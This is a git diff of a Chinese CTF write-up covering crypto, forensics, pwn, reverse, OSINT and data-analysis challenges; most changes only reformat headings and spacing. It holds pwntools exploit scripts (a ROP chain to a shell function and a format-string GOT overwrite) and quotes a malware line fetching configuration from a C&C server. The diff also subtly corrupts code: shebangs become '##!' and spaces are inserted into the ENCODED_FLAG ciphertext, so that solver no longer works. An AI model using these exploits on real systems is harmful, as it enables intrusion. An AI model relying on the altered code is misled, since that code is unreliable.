@@ -4,11 +4,11 @@ pubDate: "2025-12-02"
 description: ""
 ---
 
-# Crypto
+## Crypto
 
-## easy_encode1
+### easy_encode1
 
-### 加密过程分析
+#### 加密过程分析
 
 经典且平凡的 XOR 加密
 
@@ -19,7 +19,7 @@ for i, char in enumerate(plaintext.encode()):
 
 > `a = bytes.fromhex(encryptoed_hex)`
 
-### 密钥
+#### 密钥
 
 目标是 `flag{...}`
 
@@ -42,7 +42,7 @@ result = xor_decrypt(ciphertext, key)
 flag{s[d6]0[e3][ce][fe][e7][bf][8f]T[00]+[ca]D[11][8c][a8]l
 ```
 
-包含大量非ASCII字符，说明密钥不完整。
+包含大量非 ASCII 字符，说明密钥不完整。
 
 ```py
 len(a) = 24
@@ -62,17 +62,17 @@ print(result)
 b'flag{ZIzBw3QjdLty60CYCt}'
 ```
 
-## rickypto
+### rickypto
 
-### 前置知识
+#### 前置知识
 
 深入分析需要理解以下数学概念：
 
-1. **n维代数 (n-dimensional Algebra)**:
-    n维代数是在n维线性空间上定义加法和乘法运算的数学结构。实数构成1维代数，复数构成2维代数，八元数构成8维代数。代数结构保持了基本运算的封闭性和分配律。
+1. **n 维代数 (n-dimensional Algebra)**:
+    n 维代数是在 n 维线性空间上定义加法和乘法运算的数学结构。实数构成 1 维代数，复数构成 2 维代数，八元数构成 8 维代数。代数结构保持了基本运算的封闭性和分配律。
 
 2. **八元数 (Octonions)**:
-    八元数 $\mathbb{O}$ 是实数域上的8维非结合代数。每个八元数可表示为8个实数分量的线性组合。八元数具有以下代数特征：
+    八元数 $\mathbb{O}$ 是实数域上的 8 维非结合代数。每个八元数可表示为 8 个实数分量的线性组合。八元数具有以下代数特征：
     - **非交换性**：$ab \neq ba$
     - **非结合性**：$(ab)c \neq a(bc)$
 
@@ -90,17 +90,17 @@ b'flag{ZIzBw3QjdLty60CYCt}'
     设 $G$ 为有限群，若存在元素 $g \in G$ 使得 $G = \{g^k \mid k \in \mathbb{Z}\}$，则 $G$ 称为循环群，$g$ 称为生成元。循环群的阶等于其生成元的阶。
 
 6. **离散对数问题 (Discrete Logarithm Problem, DLP)**:
-    在循环群 $(G, \cdot)$ 中，给定生成元 $g$ 和元素 $h \in G$，求解整数 $x$ 使得 $g^x = h$ 的问题称为离散对数问题。该问题在密码学中具有重要意义，其计算复杂度随群大小的增长而指数级增加。对于64位模数，该问题可在多项式时间内求解。
+    在循环群 $(G, \cdot)$ 中，给定生成元 $g$ 和元素 $h \in G$，求解整数 $x$ 使得 $g^x = h$ 的问题称为离散对数问题。该问题在密码学中具有重要意义，其计算复杂度随群大小的增长而指数级增加。对于 64 位模数，该问题可在多项式时间内求解。
 
-### 分析
+#### 分析
 
-#### `gen.py`
+##### `gen.py`
 
-1. **初始化**: 生成一个64位的素数 `m`。
-2. **数据分块**: 将 Flag 每4个字节分为一块，并将每块转换为整数 `n`（作为指数）。
+1. **初始化**: 生成一个 64 位的素数 `m`。
+2. **数据分块**: 将 Flag 每 4 个字节分为一块，并将每块转换为整数 `n`（作为指数）。
 3. **八元数代数 (Octonion Algebra)**: 在有限域 $\mathbb{Z}_m$ 上定义八元数代数。
 4. **加密过程**:
-    - 对于每个Flag块（指数 $n$），随机生成一个八元数 $p$。
+    - 对于每个 Flag 块（指数 $n$），随机生成一个八元数 $p$。
     - 计算 $q = p^n$。
     - 公开 $m$、$p$ 的向量表示、$q$ 的向量表示。
 
@@ -108,15 +108,15 @@ b'flag{ZIzBw3QjdLty60CYCt}'
 
 然而，八元数虽然非结合，但它是**幂结合**（Power Associative）的，这意味着 $p^n$ 是定义明确的。更重要的是，八元数拥有**范数（Norm）**，且范数是乘性的。即对于八元数 $x, y$，满足 $N(xy) = N(x)N(y)$。
 
-利用这个性质，我们可以将八元数上的高维DLP降维到一维的标量域 $\mathbb{Z}_m$ 上：
+利用这个性质，我们可以将八元数上的高维 DLP 降维到一维的标量域 $\mathbb{Z}_m$ 上：
 $$N(q) = N(p^n) = N(p)^n \pmod m$$
 
 令 $a = N(p) \pmod m$ 和 $b = N(q) \pmod m$，问题转化为求解：
 $$a^n \equiv b \pmod m$$
 
-这是一个标准的模 $m$ 离散对数问题。由于 $m$ 只有64位，使用 SageMath 的 `discrete_log` 函数可以在毫秒级内解出 $n$。
+这是一个标准的模 $m$ 离散对数问题。由于 $m$ 只有 64 位，使用 SageMath 的 `discrete_log` 函数可以在毫秒级内解出 $n$。
 
-### 攻击策略
+#### 攻击策略
 
 1. 从 `output.txt` 中解析出 $m$, $p\_values$, $q\_values$。
 2. 在 SageMath 中重建 $\mathbb{Z}_m$ 上的八元数代数。
@@ -126,7 +126,7 @@ $$a^n \equiv b \pmod m$$
     - 求解离散对数 $n = \log_{N(p)} N(q) \pmod {m-1}$。
 4. 将解得的 $n$ 转换为字节并拼接，得到 Flag。
 
-### 核心代码
+#### 核心代码
 
 ```py
 for i in range(len(p_values)):
@@ -144,7 +144,7 @@ for i in range(len(p_values)):
     nq_mod = Zmod(m)(sum(x*x for x in Q_vec) % m)
 
     # 3. 求解离散对数 np^n = nq mod m
-    # 注意：阶数不一定是 m-1，但在Sage中 discrete_log 会自动处理
+    # 注意：阶数不一定是 m-1，但在 Sage 中 discrete_log 会自动处理
     try:
         n = discrete_log(nq_mod, np_mod)
         chunk = long_to_bytes(int(n))
@@ -154,11 +154,11 @@ for i in range(len(p_values)):
         print(f"Chunk {i+1}: Failed to find log!")
 ```
 
-## 这家伙在说什么呢？
+### 这家伙在说什么呢？
 
-### 培根密码（Bacon Cipher）
+#### 培根密码（Bacon Cipher）
 
-本题使用了培根密码进行加密。培根密码是一种经典的替换密码，通过5位二进制序列来表示字母：
+本题使用了培根密码进行加密。培根密码是一种经典的替换密码，通过 5 位二进制序列来表示字母：
 
 ```txt
 A = 00000    I = 01000    Q = 10000    Y = 11000
@@ -171,30 +171,30 @@ G = 00110    O = 01110    W = 10110
 H = 00111    P = 01111    X = 10111
 ```
 
-### 解密
+#### 解密
 
 ```python
-# Decode binary string using Bacon cipher
+## Decode binary string using Bacon cipher
 binary_groups = [
     "00101", "01011", "00000", "00110", "00011", "10100", "01101", "10010",
     "00111", "00000", "01101", "10010", "00111", "10100", "01110", "00011",
     "00100", "00011", "10100", "01000"
 ]
 
-# Bacon cipher mapping (A=00000, B=00001, ..., Z=11001)
+## Bacon cipher mapping (A=00000, B=00001, ..., Z=11001)
 bacon_map = {}
 for i in range(26):
     letter = chr(ord('A') + i)
     binary = format(i, '05b')
     bacon_map[binary] = letter
 
-# Decode each group
+## Decode each group
 result = ""
 for group in binary_groups:
     if group in bacon_map:
         result += bacon_map[group]
 
-# Format as flag
+## Format as flag
 flag_content = result.lower().replace("flag", "")
 print(f"Final flag: flag{{{flag_content}}}")
 ```
@@ -205,7 +205,7 @@ flag{dunshanshuodedui}
 
 > 中文意思是"盾山说得对"，呼应了题目描述中盾山"叽里咕噜"说话的情景。
 
-## codeforkk
+### codeforkk
 
 cpp 的 hashmap 加了很多优化，但是还是有妙妙小数字可以突破他的优化。
 
@@ -219,9 +219,9 @@ print(m)
 print(' '.join(str(p) for _ in range(m)))
 ```
 
-## leak_dp
+### leak_dp
 
-### 分析
+#### 分析
 
 这是一道 RSA 加密题目，但泄露了重要的信息 `dp`。
 
@@ -234,9 +234,9 @@ dp = d % (p - 1)
 - `c`: 密文
 - `e`: 公钥指数 (65537)
 
-### 漏洞原理
+#### 漏洞原理
 
-#### 什么是 dp？
+##### 什么是 dp？
 
 在 RSA 中：
 
@@ -253,7 +253,7 @@ $$dp \cdot e - 1 = k \cdot (p-1)$$
 
 对于某个整数 k
 
-#### 攻击思路
+##### 攻击思路
 
 1. 我们知道 `dp * e - 1` 必须是 `(p-1)` 的倍数
 2. 因此 `(p-1)` 必须是 `dp * e - 1` 的一个因子
@@ -283,7 +283,7 @@ $$m = c^d \bmod n$$
 
 然后用 `flag = long_to_bytes(m)` 得到 flag
 
-### 代码实现
+#### 代码实现
 
 ```python
 from Crypto.Util.number import *
@@ -294,10 +294,10 @@ dp = 513863627485670008094182801380715695808223728685300792469573813334285936335
 c = 81387127961421902230857210411279023161773956760695301546933898924006410439044243629343875994387728788391446830661374802652363868007527718797900701113897594566288568833319705717842048295047236231759241072305294457689433087267810684045886576363621162635358100858319636959737626031693142150135828215563162557116
 e = 65537
 
-# 核心：从 dp 恢复 p
+## 核心：从 dp 恢复 p
 temp = dp * e - 1
 
-# 寻找正确的 k
+## 寻找正确的 k
 for k in range(1, 100000):
     if temp % k == 0:
         p_candidate = temp // k + 1
@@ -305,12 +305,12 @@ for k in range(1, 100000):
             p = p_candidate
             break
 
-# 恢复其他参数
+## 恢复其他参数
 q = n // p
 phi = (p - 1) * (q - 1)
 d = gmpy2.invert(e, phi)
 
-# 解密
+## 解密
 m = pow(c, d, n)
 flag = long_to_bytes(m)
 
@@ -321,30 +321,30 @@ print(f"Flag: {flag.decode()}")
 Flag: flag{qeem8obeyi5lcqedkw8w}
 ```
 
-## Strange_ECC
+### Strange_ECC
 
-### 分析
+#### 分析
 
 题目给出的椭圆曲线参数满足阶数等于模数：
 $$|E(\mathbb{F}_p)| = p$$
 
 这是一条**异常椭圆曲线** (Anomalous Elliptic Curve)。此类曲线存在 **Smart Attack**，可以在多项式时间内解决 ECDLP。
 
-### 攻击
+#### 攻击
 
 利用 SageMath 的 `discrete_log` 可以直接处理异常曲线的 DLP。
 
 ```python
-# SageMath
+## SageMath
 F = GF(p)
 E = EllipticCurve(F, [A, B])
 G = E(Gx, Gy)
 Q = E(Qx, Qy)
 
-# 验证异常性
+## 验证异常性
 print(E.order() == p) # True
 
-# Smart Attack 求解 d
+## Smart Attack 求解 d
 d = G.discrete_log(Q)
 print(d)
 ```
@@ -352,7 +352,7 @@ print(d)
 得到私钥：
 `d = 61859534623601494462930656514060814065864458829849606574762191787997165697161`
 
-### 解密
+#### 解密
 
 加密逻辑为 `plaintext ^ SHA256(str(d))`。
 
@@ -373,11 +373,11 @@ print(flag.decode())
 flag{ce742789f47d667479f6003c32e3b630}
 ```
 
-# Forensic
+## Forensic
 
-## 原神，启动
+### 原神，启动
 
-### 流量分析
+#### 流量分析
 
 这是一个流量分析题目。首先通过 `tshark` 提取 HTTP 对象：
 
@@ -387,17 +387,17 @@ tshark -r its-genshin-time.pcap --export-objects http,extracted_files/
 
 提取得到恶意脚本 `5cr1p7` 、Config 数据 `c0nfi9ur@t1on` 和加密数据 `%2f`。
 
-### 加密逻辑分析
+#### 加密逻辑分析
 
 分析 `5cr1p7` 脚本，发现其从 C&C 服务器获取配置，并使用自定义 Base64 上传数据。
 
-#### flag 在 `challenge.secret.info` 项内
+##### flag 在 `challenge.secret.info` 项内
 
 ```sh
 JSON_PAYLOAD="$JSON_PAYLOAD\"challenge.secret.info\": \"$SECRET_INFO\","
 ```
 
-#### `c0nfi9ur@t1on` 的内容被用来生成码表
+##### `c0nfi9ur@t1on` 的内容被用来生成码表
 
 ```sh
 curl -s -L "$CONFIG_URL" -o "$CONFIG_PATH"
@@ -415,7 +415,7 @@ echo "2570717b7469206522445a2137486074294a3c6664777e613e763d2a3271454b2b49393b68
 得到自定义 Base64 码表：
 `6Qs+Pfw1EXyk75HO2mGlYaBtzZxhj9o4g/LVnNcRrDuKIpbA3WUq0e8MdCTSFivJ`
 
-### 解密 Payload
+#### 解密 Payload
 
 编写脚本解密 `%2f` 文件内容：
 
@@ -430,7 +430,7 @@ trans = str.maketrans(custom_alphabet, standard_alphabet)
 with open("extracted_files/%2f", "r") as f:
     payload = f.read().strip()
 
-# 替换码表并补全 padding
+## 替换码表并补全 padding
 std_payload = payload.translate(trans)
 std_payload += '=' * ((4 - len(std_payload) % 4) % 4)
 
@@ -442,13 +442,13 @@ print(data['challenge.secret.info'])
 flag{M@G15K-moDU1e-cAn-bE-riskYyyyy-5O_bE-CaRefu1-WHeN_iN5T4LI1Ng_lT}
 ```
 
-# Misc
+## Misc
 
-## BaseHajimi
+### BaseHajimi
 
 根据题目 `BaseXXX` 和题面预测是 Base8
 
-### 建立映射关系
+#### 建立映射关系
 
 `flag{`: `01100110 01101100 01100001 01100111 01111011`
 
@@ -490,9 +490,9 @@ for i in range(0, len(binary_str), 8):
 print(flag)
 ```
 
-## フラッグモザイク
+### フラッグモザイク
 
-### 分析
+#### 分析
 
 ```bash
 exiftool image.tif
@@ -502,7 +502,7 @@ exiftool image.tif
 Page Count: 4
 ```
 
-发现这是一个多页TIFF文件，包含4个页面：
+发现这是一个多页 TIFF 文件，包含 4 个页面：
 
 ```bash
 tiffinfo image.tif
@@ -514,36 +514,36 @@ tiffinfo image.tif
 PageName: flag
 ```
 
-第2页名为"flag"，提取一下
+第 2 页名为"flag"，提取一下
 
 ```bash
 magick "image.tif[2]" alpha-2.png
 ```
 
-在`alpha-2.png`中发现flag，扔给OCR或者AI（注意 0 和 O 容易混）
+在`alpha-2.png`中发现 flag，扔给 OCR 或者 AI（注意 0 和 O 容易混）
 
-## 知识问答
+### 知识问答
 
 直接复制扔给 AI 出答案填进去😋
 
-## 调查问卷
+### 调查问卷
 
 啦啦啦～
 
-## RickyLang 杨辉三角
+### RickyLang 杨辉三角
 
-### 分析
+#### 分析
 
-（用 xmake 跑了一次 build 提示我没有 llvm 但其实我有，然后我就懒得继续弄了，反正可以 remote build,然后我就抓包然后让 AI 写了一个脚本自动传云端 build 然后获取结果）
+（用 xmake 跑了一次 build 提示我没有 llvm 但其实我有，然后我就懒得继续弄了，反正可以 remote build，然后我就抓包然后让 AI 写了一个脚本自动传云端 build 然后获取结果）
 
-#### 特质
+##### 特质
 
 - 变量不可变（immutable）
 - 控制结构不完整（while、比较操作符）
 - extern io lib
 - 支持内联 LLVM IR 汇编：`function() -> Type = asm { ... }`
 
-### 核心思路
+#### 核心思路
 
 简单阅读源码发现很多语言细节是没有实现的，但是关键的有两点：
 
@@ -553,7 +553,7 @@ magick "image.tif[2]" alpha-2.png
 不难猜测比较优雅的实现方式是使用 llvm ir 来实现那些没有实现的特性。
 但是我懒得弄了，直接让 AI 用 llvm ir 实现了全部内容；写的代码真的难看死了。。。
 
-### 实现
+#### 实现
 
 ```txt
 putchar: (c: Int) -> Int;
@@ -672,9 +672,9 @@ program_done:
 }
 ```
 
-### 补充
+#### 补充
 
-##### phi 指令说明
+###### phi 指令说明
 
 `phi` 指令用于在控制流汇合点选择不同前驱块的值：
 
@@ -683,7 +683,7 @@ program_done:
   - 如果来自 `%row_done` 块，`%r` 取值 `%r_next`
 - 实现了变量在不同循环迭代间的状态传递
 
-#### 输入解析
+##### 输入解析
 
 ```llvm
 ; 读取输入并处理一位数/两位数
@@ -704,7 +704,7 @@ entry:
   %n = select i1 %c2_is_digit, i32 %two_digit, i32 %d1
 ```
 
-#### 杨辉三角递推算法
+##### 杨辉三角递推算法
 
 ```llvm
 ; 外层循环：控制行数 (0到n-1)
@@ -732,7 +732,7 @@ next_col:
   br label %col_loop
 ```
 
-#### 多位数打印策略
+##### 多位数打印策略
 
 ```llvm
 ; 根据数字位数选择打印方式
@@ -767,19 +767,19 @@ print_digit_loop:
   call i32 @putchar(i32 %char_val)
 ```
 
-## 欢迎来到我的 Github Profile
+### 欢迎来到我的 Github Profile
 
-### 分析
+#### 分析
 
 > 一直被仓库里面的那个 issue 干扰，😁
 
-账号24年创建，23年却有提交；结合网上有刷 commit 来自定义热力图图形的项目可知 flag 就在这里。
+账号 24 年创建，23 年却有提交；结合网上有刷 commit 来自定义热力图图形的项目可知 flag 就在这里。
 
 使用 api 提取 23 年的贡献数据
 
 <https://github-contributions-api.jogruber.de/v4/Luminoria>
 
-筛选+处理得到以下数据
+筛选 + 处理得到以下数据
 
 ```txt
 [0, 0, 0, 0, 0, 0, 0, 1, 3, 1, 3, 1, 3, 6, 0, 1, 3, 0, 1, 1, 3, 1, 6, 1, 6, 3, 6, 1, 3, 1, 6, 1, 3, 3, 1, 1, 6, 1, 0, 1, 3, 3, 0, 1, 1, 1, 1, 1, 3, 0, 3, 0, 3, 6, 1, 1, 3, 0, 6, 0, 6, 0, 0, 1, 3, 6, 3, 1, 6, 1, 0, 1, 1, 0, 3, 1, 3, 6, 0, 1, 3, 0, 3, 1, 6, 1, 1, 1, 1, 1, 0, 0, 6, 0, 1, 0, 6, 0, 0, 1, 0, 6, 3, 1, 1, 0, 6, 0, 3, 6, 1, 1, 0, 0, 6, 1, 0, 0, 0, 1, 3, 6, 3, 1, 1, 6, 6, 1, 0, 0, 3, 1, 3, 1, 1, 0, 3, 6, 1, 1, 6, 1, 3, 0, 6, 0, 1, 0, 6, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 6, 0, 1, 0, 6, 0, 1, 1, 3, 1, 0, 3, 6, 1, 1, 1, 0, 6, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 6, 3, 0, 3, 6, 1, 1, 0, 6, 6, 1, 3, 6, 3, 1, 1, 6, 6, 1, 1, 1, 0, 1, 0, 3, 0, 1, 0, 1, 1, 0, 3, 6, 1, 1, 1, 0, 0, 1, 6, 0, 3, 0, 6, 0, 0, 1, 3, 1, 3, 1, 3, 3, 1, 1, 0, 6, 0, 0, 6, 0, 6, 1, 6, 6, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
@@ -787,7 +787,7 @@ print_digit_loop:
 
 AI 分析：<https://grok.com/share/c2hhcmQtMi1jb3B5_07d94dbc-90b6-4318-b27f-51dfcd1761e6>
 
-有4个数字（0, 1, 3, 6）
+有 4 个数字（0, 1, 3, 6）
 
 - `0` → `00`
 - `1` → `01`
@@ -796,32 +796,32 @@ AI 分析：<https://grok.com/share/c2hhcmQtMi1jb3B5_07d94dbc-90b6-4318-b27f-51d
 
 拼接，然后 long to bytes
 
-# OSINT
+## OSINT
 
-## Neko Q&A
+### Neko Q&A
 
 1. 根据图片内容的标识文字
    搜索 2025 good smile miku 上海
    <https://x.com/goodsmileracing/status/1968190562525385006>
 
-2. AI 直出: <https://gemini.google.com/share/31ba5550cc4c>
+2. AI 直出：<https://gemini.google.com/share/31ba5550cc4c>
 
 3. <https://baike.baidu.com/item/%E5%9C%86%E8%9E%8D%E6%97%B6%E4%BB%A3%E5%B9%BF%E5%9C%BA/920397>
 
-## 广工问答
+### 广工问答
 
 <https://grok.com/share/c2hhcmQtMi1jb3B5_72fa03c3-ecf3-43ac-be0e-6d56f0613ac3>
 
 1. <https://nic.gdut.edu.cn/search_list.jsp?wbtreeid=1322> 搜索 广东工业大学网络安全技能大赛
 2. <https://bwc.gdut.edu.cn/info/1101/3775.htm>
-3. SULCMIS-OPAC 4.01。该信息来源于图书馆OPAC平台的版权声明，可通过以下链接查看页面底部footer确认
+3. SULCMIS-OPAC 4.01。该信息来源于图书馆 OPAC 平台的版权声明，可通过以下链接查看页面底部 footer 确认
 4. <https://www.gdut.edu.cn/info/1709/23208.htm>
 
-# DS
+## DS
 
-## Plain HTTP Data
+### Plain HTTP Data
 
-### 流量分析
+#### 流量分析
 
 使用 `tshark` 分析 HTTP POST 请求：
 
@@ -831,7 +831,7 @@ tshark -r "Plain-HTTP-Data.pcapng" -Y "http.request.method == POST" -T fields -e
 
 发现所有 POST 请求都发往 `/verify` 端点，内容类型为 `application/json`。
 
-### 数据提取
+#### 数据提取
 
 提取 JSON 数据：
 
@@ -847,12 +847,12 @@ tshark -r "Plain-HTTP-Data.pcapng" -Y "http.request.method == POST" -T fields -e
   "gender": "女",
   "id": "120116198904050546",
   "phone_number": "15366341576",
-  "address": "河南省丽华市蓟州西宁街J座",
+  "address": "河南省丽华市蓟州西宁街 J 座",
   "email": "huwei@example.net"
 }
 ```
 
-### CSV 构建
+#### CSV 构建
 
 创建 CSV 文件头：
 
@@ -867,9 +867,9 @@ tshark -r "Plain-HTTP-Data.pcapng" -Y "http.request.method == POST" -T fields -e
 jq -r '[.name, .gender, .id, .phone_number, .address, .email] | @csv' >> employees.csv
 ```
 
-## 找回订单
+### 找回订单
 
-### 日志分析
+#### 日志分析
 
 定位关键数据位置：
 
@@ -885,25 +885,25 @@ grep -n "INSERT INTO" query.log
 32583:INSERT INTO orders (id, user_id, product_id, quantity, status, created_at) VALUES
 ```
 
-### 数据结构分析
+#### 数据结构分析
 
 寻找并查看相应的表：
 
-#### Users
+##### Users
 
 ```sql
 INSERT INTO users (username, email, department, created_at) VALUES
 ('张伟', 'zhangwei@adctf.org', '研发部', '2024-01-01 09:00:00'),
 ```
 
-#### Products
+##### Products
 
 ```sql
 INSERT INTO products (name, price, stock, created_at) VALUES
 ('ADLab 云服务器 M1', 2999.00, 50, '2025-02-01 00:00:00'),
 ```
 
-#### Orders
+##### Orders
 
 ```sql
 INSERT INTO orders (id, user_id, product_id, quantity, status, created_at) VALUES
@@ -915,35 +915,35 @@ INSERT INTO orders (id, user_id, product_id, quantity, status, created_at) VALUE
 
 我们解析 orders，然后对照着填补上对应的 user 和 product 信息 即可。
 
-### 数据提取脚本
+#### 数据提取脚本
 
 ```python
-#!/usr/bin/env python3
+##!/usr/bin/env python3
 import re, csv
 
 with open('query.log', 'r', encoding='utf-8') as f:
     log = f.read()
 
-# 提取用户名（只取第一个字段）
+## 提取用户名（只取第一个字段）
 users_match = re.search(r"INSERT INTO users.*?VALUES\n((?:\([^)]+\),?\n?)*)", log, re.DOTALL)
 users = {i: name for i, name in enumerate(
     re.findall(r"\('([^']+)'", users_match.group(1)), 1
 )}
 
-# 提取产品名（只取第一个字段）
+## 提取产品名（只取第一个字段）
 products_match = re.search(r"INSERT INTO products.*?VALUES\n((?:\([^)]+\),?\n?)*)", log, re.DOTALL)
 products = {i: name for i, name in enumerate(
     re.findall(r"\('([^']+)'", products_match.group(1)), 1
 )}
 
-# 提取订单（所有6个字段）
+## 提取订单（所有 6 个字段）
 orders_match = re.search(r"INSERT INTO orders.*?VALUES\n((?:\([^)]+\),?\n?)*)", log, re.DOTALL)
 orders = re.findall(
     r"\((\d+),\s*(\d+),\s*(\d+),\s*(\d+),\s*'([^']+)',\s*'([^']+)'\)",
     orders_match.group(1)
 )
 
-# 生成CSV
+## 生成 CSV
 with open('recovered_orders.csv', 'w', encoding='utf-8', newline='') as f:
     writer = csv.writer(f)
     writer.writerow(['username', 'product', 'quantity', 'status', 'created_at'])
@@ -952,12 +952,12 @@ with open('recovered_orders.csv', 'w', encoding='utf-8', newline='') as f:
             users[int(uid)], products[int(pid)], qty, status, time
         ])
 
-print(f"用户: {len(users)}, 产品: {len(products)}, 订单: {len(orders)}")
+print(f"用户：{len(users)}, 产品：{len(products)}, 订单：{len(orders)}")
 ```
 
-# Pwn
+## Pwn
 
-## checkin
+### checkin
 
 <https://grok.com/share/c2hhcmQtMi1jb3B5_07861ba3-cd58-4984-9ddc-8840e3669433>
 
@@ -1002,11 +1002,11 @@ payload += p64(decrypt_cmd)
 payload += p64(get_shell)
 ```
 
-## 井字棋
+### 井字棋
 
 <https://gemini.google.com/share/ecb3495d66a1>
 
-### 思路
+#### 思路
 
 ```c
 08049d3c        printf(format: ">>> ")
@@ -1019,10 +1019,10 @@ payload += p64(get_shell)
 
 这里 read 了 stdin，覆盖 `exit@GOT` 为 `win()`
 
-### EXP
+#### EXP
 
 ```python
-#!/usr/bin/env python3
+##!/usr/bin/env python3
 from pwn import *
 
 elf = ELF('./chal')
@@ -1031,11 +1031,11 @@ EXIT_GOT = elf.got['exit']
 
 p = remote(REMOTE)
 
-# 构造格式化字符串 payload
+## 构造格式化字符串 payload
 writes = {EXIT_GOT: WIN_ADDR}
 payload = fmtstr_payload(6, writes, write_size='short')
 
-# 游戏流程：输两步让电脑赢
+## 游戏流程：输两步让电脑赢
 p.recvuntil(b'(1-9): ')
 p.sendline(b'2')
 p.recvuntil(b'(1-9): ')
@@ -1047,9 +1047,9 @@ p.sendline(payload)
 p.interactive()
 ```
 
-# Reverse
+## Reverse
 
-## 签到
+### 签到
 
 ```sh
 zig build-exe main.c -lc -target x86_64-windows-gnu -O ReleaseFast
@@ -1058,9 +1058,9 @@ zig build-exe main.c -lc
 
 或者使用 godbolt
 
-## canUCIt
+### canUCIt
 
-看到 `cors::xxx`、`traits` 了，Ruast 逆向（期间我借助 llvm 反编译工具，成功生成了一个11万行的 c 代码和 ll、bc、dsm 代码（不懂）😭）
+看到 `cors::xxx`、`traits` 了，Ruast 逆向（期间我借助 llvm 反编译工具，成功生成了一个 11 万行的 c 代码和 ll、bc、dsm 代码（不懂）😭）
 
 <https://gemini.google.com/share/7289a5dda03d>
 
@@ -1079,17 +1079,17 @@ Key = sha256("W3lcomeT0ADC7F")
 CHARSET = "W3lcomeT0ADC7FOPQRSHUVJXYZabKdGfghijkLNnEpqrstuvwxyzI12B456M89+/"
 ```
 
-## 野兽仙贝的呐喊
+### 野兽仙贝的呐喊
 
 python 逆向，连蒙带猜
 
-### 拆包
+#### 拆包
 
 ```sh
 pyinstxtractor-ng ./yajusenpai
 ```
 
-### 反编译
+#### 反编译
 
 尝试了 uncompyle6、uncompyle3 和 pycdc，pycdc 效果最好
 
@@ -1097,12 +1097,12 @@ pyinstxtractor-ng ./yajusenpai
 find . -name "*.pyc" -exec sh -c 'pycdc "$0" > "${0%.pyc}.py"' {} \;
 ```
 
-### 分析
+#### 分析
 
 审计 main.py
 
 ```py
-ENCODED_FLAG = 'プ斯前i是臭三、に压田ク会田员ね内し悲に哼厅撅池食三でそ好辈m俺二、ぎ压で所！そ沢三林喜ス哼檎马'
+ENCODED_FLAG = 'プ斯前 i 是臭三、に压田ク会田员ね内し悲に哼厅撅池食三でそ好辈 m 俺二、ぎ压で所！そ沢三林喜ス哼檎马'
 KEY = [1, 1, 4, 5, 1, 4, 1, 9, 1, 9, 8, 1, 0]
 ```
 
@@ -1119,9 +1119,9 @@ def main():
 ```
 
 ```py
-# base114_encode.py
+## base114_encode.py
 CHARSET = ['0', '1', '3', '4', '5', '6', '8', '9', 'a', 'e', 'i', 'm', 'n', 'p', 'r', '、', '。', 'い', 'う', 'お', 'か', 'が', 'き', 'ぎ', 'く', 'こ', 'し', 'す', 'そ', 'だ', 'ち', 'で', 'に', 'ね', 'は', 'ま', 'も', 'や', 'ょ', 'よ', 'り', 'ろ', 'イ', 'ク', 'ス', 'ッ', 'プ', 'ホ', 'ム', 'モ', 'レ', 'ン', '一', '三', '下', '个', '二', '仲', '会', '你', '俺', '先', '兽', '内', '制', '前', '力', '北', '厅', '压', '员', '哼', '啊', '喜', '回', '夏', '夜', '好', '子', '屑', '恼', '悲', '所', '撅', '斯', '是', '普', '林', '梦', '檎', '汉', '池', '沢', '沼', '浩', '獣', '田', '臭', '菓', '行', '輩', '辈', '過', '野', '鉴', '银', '雪', '雷', '食', '餐', '马', '！', '（', '？']
-# WARNING: Decompyle incomplete
+## WARNING: Decompyle incomplete
 ```
 
 <https://gemini.google.com/share/4c39c4f18e67>
@@ -1131,11 +1131,11 @@ CHARSET = ['0', '1', '3', '4', '5', '6', '8', '9', 'a', 'e', 'i', 'm', 'n', 'p',
 ```py
 from itertools import cycle
 
-# 1. 从 base114_encode.py 提取的字符集
+## 1. 从 base114_encode.py 提取的字符集
 CHARSET = ['0', '1', '3', '4', '5', '6', '8', '9', 'a', 'e', 'i', 'm', 'n', 'p', 'r', '、', '。', 'い', 'う', 'お', 'か', 'が', 'き', 'ぎ', 'く', 'こ', 'し', 'す', 'そ', 'だ', 'ち', 'で', 'に', 'ね', 'は', 'ま', 'も', 'や', 'ょ', 'よ', 'り', 'ろ', 'イ', 'ク', 'ス', 'ッ', 'プ', 'ホ', 'ム', 'モ', 'レ', 'ン', '一', '三', '下', '个', '二', '仲', '会', '你', '俺', '先', '兽', '内', '制', '前', '力', '北', '厅', '压', '员', '哼', '啊', '喜', '回', '夏', '夜', '好', '子', '屑', '恼', '悲', '所', '撅', '斯', '是', '普', '林', '梦', '檎', '汉', '池', '沢', '沼', '浩', '獣', '田', '臭', '菓', '行', '輩', '辈', '過', '野', '鉴', '银', '雪', '雷', '食', '餐', '马', '！', '（', '？']
 
-# 2. 从 main.py 提取的密文和密钥
-ENCODED_FLAG = 'プ斯前i是臭三、に压田ク会田员ね内し悲に哼厅撅池食三でそ好辈m俺二、ぎ压で所！そ沢三林喜ス哼檎马'
+## 2. 从 main.py 提取的密文和密钥
+ENCODED_FLAG = 'プ斯前 i 是臭三、に压田ク会田员ね内し悲に哼厅撅池食三でそ好辈 m 俺二、ぎ压で所！そ沢三林喜ス哼檎马'
 KEY = [1, 1, 4, 5, 1, 4, 1, 9, 1, 9, 8, 1, 0]
 
 def base114_decode(encoded_str):
@@ -1188,19 +1188,19 @@ if __name__ == '__main__':
     main()
 ```
 
-# Web
+## Web
 
-## Crossy Road
+### Crossy Road
 
-浏览器查看源代码就可以看到 flag 在 js文件的注释里，传到 cyberchef 上面（最开始我调用了一次 base64 没出，还在疑惑中，扔给 AI 分析了，其实是两次 base64；下次一次 base64 出不来可以试试 magic）
+浏览器查看源代码就可以看到 flag 在 js 文件的注释里，传到 cyberchef 上面（最开始我调用了一次 base64 没出，还在疑惑中，扔给 AI 分析了，其实是两次 base64；下次一次 base64 出不来可以试试 magic）
 
